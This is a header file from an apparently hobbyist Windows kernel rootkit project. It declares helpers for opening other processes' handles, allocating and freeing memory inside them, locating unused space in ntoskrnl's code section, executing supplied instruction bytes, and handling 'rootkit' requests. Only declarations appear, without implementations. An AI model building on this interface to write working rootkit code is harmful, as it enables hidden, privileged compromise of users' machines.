#pragma once
#include "memory.h"


// Memory functions pool structure is 'Hl..'
namespace general_helpers {
	NTSTATUS OpenProcessHandleADD(HANDLE* Process, ULONG64 PID);  // Get process handle with PID of the process
	NTSTATUS CopyStringAfterCharADD(PUNICODE_STRING OgString, PUNICODE_STRING NewString, WCHAR Char);  // Copy substring after last apearance of defined character
	BOOL CompareUnicodeStringsADD(PUNICODE_STRING First, PUNICODE_STRING Second, USHORT CheckLength);  // Compare two unicode strings
	BOOL IsExistFromIndexADD(PUNICODE_STRING Inner, PUNICODE_STRING Outer, USHORT StartIndex);  // Find inner in outer from start index
	BOOL ComparePathFileToFullPathADD(PUNICODE_STRING FullPath, PUNICODE_STRING Path, PUNICODE_STRING FileName);  // Compare between a path and a file inside it to a full path
	void PrintUnicodeStringADD(PUNICODE_STRING Str);  // Print a UNICODE_STRING letter-by-letter
	NTSTATUS GetPidNameFromListADD(ULONG64* ProcessId, char ProcessName[15], BOOL NameGiven);  // Get the PID of a process from its name
	ULONG GetActualLengthADD(PUNICODE_STRING String);  // Get the actual length of the string
}

namespace memory_helpers {
	BOOL FreeAllocatedMemoryADD(PEPROCESS EpDst, ULONG OldState, PVOID BufferAddress, SIZE_T BufferSize);  // frees memory that was allocated during writing/by CommitMemoryRegionsADD
	PVOID AllocateMemoryADD(PVOID InitialAddress, SIZE_T AllocSize, KAPC_STATE* CurrState, ULONG_PTR ZeroBits);  // allocate memory by parameters (assumes: already attached)
	ULONG64 GetHighestUserModeAddrADD();  // retrieves the maximum usermode address for the local machine
	void ExecuteInstructionsADD(BYTE Instructions[], SIZE_T InstructionsSize);  // Execute the instructions given
	PVOID FindUnusedMemoryADD(BYTE* SearchSection, ULONG SectionSize, SIZE_T NeededLength);  // Find a section of code with enough empty instuctions to fit a NeededLength sized data in it
	PVOID GetModuleBaseAddressADD(const char* ModuleName);  // Get the base address of a system module/ntoskrnl.exe
	PVOID GetTextSectionOfSystemModuleADD(PVOID ModuleBaseAddress, ULONG* TextSectionSize);  // Get the address of the code (.text) section of a system module
	PIMAGE_SECTION_HEADER GetSectionHeaderFromName(PVOID ModuleBaseAddress, const char* SectionName);  // Get the section by the name from a system module
}

namespace requests_helpers {
	RKSYSTEM_INFORET RequestSystemInfoADD(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag);  // request specific system information (part 1)
	SIZE_T GetExpectedInfoSizeADD(SYSTEM_INFORMATION_CLASS InfoType);  // returns the expected system information buffer size needed for the query, only if the first call to get required size does not work
	NTSTATUS ExitRootkitRequestADD(PEPROCESS From, PEPROCESS To, ROOTKIT_STATUS StatusCode, NTSTATUS Status, ROOTKIT_MEMORY* RootkInst);  // general function to exit gracefully from a request
}